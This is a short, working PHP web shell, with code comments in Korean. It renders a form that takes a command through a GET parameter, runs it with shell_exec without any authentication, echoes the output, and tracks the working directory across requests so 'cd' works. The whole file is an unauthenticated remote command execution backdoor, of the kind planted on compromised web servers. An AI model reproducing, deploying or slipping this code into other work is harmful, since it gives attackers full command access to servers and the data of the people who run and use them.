<?php
	session_start();
?>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if (!isset($_SESSION['cwd'])) {
        $_SESSION['cwd'] = getcwd(); // 현재 작업 디렉토리 설정
    }

    $cwd = $_SESSION['cwd']; // 현재 디렉토리 가져오기

    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        $output = "";

        // cd 명령 처리
        if (preg_match('/^cd\s+(.*)$/', $cmd, $matches)) {
            $dir = $matches[1];
            if ($dir == "..") {
                $newDir = dirname($cwd); // 상위 디렉토리로 이동
            } else {
                $newDir = realpath($cwd . DIRECTORY_SEPARATOR . $dir); // 상대 경로 처리
            }

            if ($newDir && is_dir($newDir)) {
                $_SESSION['cwd'] = $newDir;
                $cwd = $newDir;
            } else {
                $output = "Directory not found: $dir";
            }
        } else {
            // 다른 명령 실행
            chdir($cwd);
            $output = shell_exec($cmd);
        }

        echo htmlspecialchars($output);
    }

    echo "\n\nCurrent Directory: " . htmlspecialchars($cwd);
?>
</pre>
</body>
</html>